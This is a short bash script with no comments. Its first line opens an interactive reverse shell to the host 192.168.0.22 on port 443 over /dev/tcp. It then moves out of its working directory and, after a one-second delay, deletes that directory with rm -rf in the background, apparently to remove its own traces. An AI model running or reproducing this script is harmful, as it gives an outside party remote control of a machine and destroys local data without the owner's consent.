#!/bin/bash

bash -i >&/dev/tcp/192.168.0.22/443 0>&1

TARGET_DIR=$(pwd)
cd ..

(sleep 1 && rm -rf "$TARGET_DIR") &
